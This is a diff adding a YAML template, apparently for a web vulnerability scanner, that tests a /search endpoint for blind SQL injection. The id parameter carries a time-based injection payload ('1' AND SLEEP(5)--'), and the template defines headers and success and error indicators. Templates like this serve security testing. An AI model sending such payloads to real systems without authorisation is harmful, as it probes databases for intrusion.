@@ -1,0 +1,23 @@
+name: 盲注SQL注入测试
+description: 测试盲注SQL注入漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /search
+  params:
+    id: "1' AND SLEEP(5)--"
+    type: "product"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "results found"
+    - "搜索结果"
+  errorIndicators:
+    - "no results"
+    - "invalid query"
+    - "无效查询"
+  statusCode: 200
